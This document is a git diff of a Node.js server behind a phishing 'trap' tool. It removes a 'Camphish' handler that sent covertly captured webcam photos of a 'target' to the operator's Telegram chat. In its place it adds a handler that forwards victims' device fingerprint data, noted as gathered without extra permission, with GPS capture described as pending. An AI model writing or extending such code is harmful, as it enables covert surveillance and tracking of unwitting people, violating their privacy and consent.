@@ -204,37 +204,33 @@ async function startServer() {
     app._router.handle(req, res, () => {});
   });
 
-  // Handle Camphish Image Upload
-  app.post('/api/log/:id/cam', (req, res) => {
+  // Handle Device Metadata Upload
+  app.post('/api/log/:id/info', (req, res) => {
     const id = req.params.id;
-    console.log(`[CAM] Received request for ID: ${id}`);
     const chatId = getChatIdFromTrapId(id);
     if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
-      const { image } = req.body;
-      if (image && typeof image === 'string') {
-        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
-        const imageBuffer = Buffer.from(base64Data, 'base64');
-        const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-        
-        const caption = `📸 <b>CAPTURE SUCCESS! (CAMPHISH)</b> 📸\n` +
-                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                        `✅ <b>Status:</b> Kamera Berhasil Diakses\n` +
-                        `🎭 <b>Wajah Target Terdeteksi!</b>\n` +
-                        `━━━━━━━━━━━━━━━━━━━━\n` +
-                        `<i>Data ini diambil secara real-time saat target berada di halaman trap.</i>`;
+      const data = req.body;
+      const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
+      
+      const msg = `📱 <b>DEVICE METADATA CAPTURED!</b> 📱\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `🖥️ <b>Resolution:</b> <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
+                  `🔋 <b>Battery:</b> <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
+                  `🌍 <b>Timezone:</b> <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `⚙️ <b>CPUs:</b> <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                  `🧠 <b>RAM:</b> <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `🌐 <b>Lang:</b> <code>${escapeHTML(data.language || 'N/A')}</code>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `💡 <i>Menunggu data GPS... Berhasil mengambil info hardware tanpa izin tambahan.</i>`;
 
-        bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { 
-          caption, 
-          parse_mode: 'HTML' 
-        }).catch(err => {
-          console.error("Telegram SendPhoto Error:", err);
-        });
-      } else {
-        console.warn("[CAM] No image data in request body");
-      }
-    } else {
-      console.warn(`[CAM] No valid chatId (${chatId}) or Token missing`);
+      bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
+    res.sendStatus(200);
+  });
+
+  // Handle Camphish Image Upload (Keep for legacy, but user requested removal)
+  app.post('/api/log/:id/cam', (req, res) => {
+    // Silently acknowledge but don't process since user requested removal
     res.sendStatus(200);
   });
 
